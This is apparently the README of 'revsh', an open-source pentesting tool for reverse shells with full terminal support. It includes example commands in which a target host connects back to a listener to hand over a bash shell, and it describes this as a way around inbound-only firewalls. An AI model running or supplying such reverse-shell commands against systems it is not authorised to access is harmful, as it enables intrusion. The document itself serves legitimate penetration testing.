# revsh #

_revsh_ is a tool for establishing reverse shells with full [terminal](http://en.wikipedia.org/wiki/Computer_terminal) support.

**What is a "reverse shell"?**

A [reverse shell](http://www.sans.edu/student-files/presentations/LVReverseShell.pdf) is a network connection that grants [shell](http://en.wikipedia.org/wiki/Shell_%28computing%29) access to a remote host. As opposed to other remote login tools such as [telnet](http://en.wikipedia.org/wiki/Telnet) and [ssh](http://en.wikipedia.org/wiki/Secure_Shell), a reverse shell is initiated by the remote host. This technique of connecting outbound from the remote network allows for circumvention of firewalls that are configured to block inbound connections only. 

**Can't I just use [netcat](http://en.wikipedia.org/wiki/Netcat)?**

There are [many techniques](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for establishing a reverse shell, but these methods don't provide terminal support. _revsh_ allows for a reverse shell whose connection is mediated by a [pseudo-terminal](http://en.wikipedia.org/wiki/Pseudoterminal), and thus allows for features such as:

 * [job control](http://en.wikipedia.org/wiki/Job_control)
 * [control character processing](http://en.wikipedia.org/wiki/Control_character) (e.g [Ctrl-C](http://en.wikipedia.org/wiki/Control-C))
 * [auto-completion](http://en.wikipedia.org/wiki/Auto-completion)
 * support for programs requiring a [controlling tty](https://github.com/emptymonkey/ctty) (e.g. [sudo](http://en.wikipedia.org/wiki/Sudo))
 * [processing of window re-size events](http://linux.die.net/man/4/tty_ioctl)

_revsh_ is intended as a supplementary tool for a [pentester's](http://en.wikipedia.org/wiki/Pentester) toolkit that provides the full set of terminal features in a small (~20k) easy to use binary.

## Usage ##

	usage: revsh [-l] [-s SHELL] [-e ENV_ARGS] ADDRESS PORT

## Example ##

First, setup the listener on the local host:

	empty@monkey:~$ revsh -l 192.168.0.42 9999

Then connect out from the remote host:

	target@kitty:~$ ./revsh -s /bin/bash 192.168.0.42 9999
	
We will now find a shell waiting for us back at the listener:

	empty@monkey:~$ revsh -l 192.168.0.42 9999
	Listening...	Connected!
	Initializing...	Done!
	################################
	# hostname: kitty
	# ip address: 192.168.0.6
	# username: target
	################################
	target@kitty:/$ ls -l /etc/passwd 
	-rw-r--r-- 1 root root 1375 Jul  2 10:24 /etc/passwd

## Installation ##

	git clone git@github.com:emptymonkey/revsh.git
	cd revsh
	make

## A Quick Note on Ethics ##

I write and release these tools with the intention of educating the larger [IT](http://en.wikipedia.org/wiki/Information_technology) community and empowering legitimate pentesters. If I can write these tools in my spare time, then rest assured that the dedicated malicious actors have already developed versions of their own.

